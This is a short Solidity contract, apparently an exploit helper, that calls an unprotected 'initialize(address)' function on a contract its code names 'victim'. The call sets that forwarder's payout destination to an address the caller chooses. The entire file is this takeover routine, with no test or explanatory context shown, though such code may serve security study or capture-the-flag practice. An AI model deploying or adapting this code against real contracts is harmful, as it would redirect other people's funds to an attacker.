// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Forwarder {
    function destination() external view returns (address payable);
    function initialize(address payable _destination) external;
}

contract AuthorizationExecutor {
    error InitializeFailed(address victim, address destination, bytes reason);
    event ForwardingSetup(
        address indexed victim,
        address destination,
        bool success
    );

    function setupForwarding(
        address victim,
        address payable destination
    ) external {
        (bool success, bytes memory reason) = victim.call(
            abi.encodeWithSignature("initialize(address)", destination)
        );
        emit ForwardingSetup(victim, destination, success);
        if (!success) {
            revert InitializeFailed(victim, destination, reason);
        }
    }
}